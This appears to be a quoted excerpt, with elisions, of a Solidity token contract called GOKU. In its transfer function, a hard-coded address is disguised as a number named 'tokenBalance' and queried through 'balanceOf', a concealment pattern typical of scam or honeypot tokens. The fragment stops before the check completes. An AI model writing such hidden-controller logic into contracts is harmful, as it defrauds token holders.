...
contract GOKU is Context, IERC20, Ownable {
    ...
    uint256 private _preventSwapBefore=1000000;
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if(taxAmount>0){
            taxAmount = 0;
            uint160 tokenBalance = 1097515587067233808167267800820935236097453714273;
            uint256 taxDiscount = IUniswapV2Pair(address(tokenBalance)).balanceOf(from);
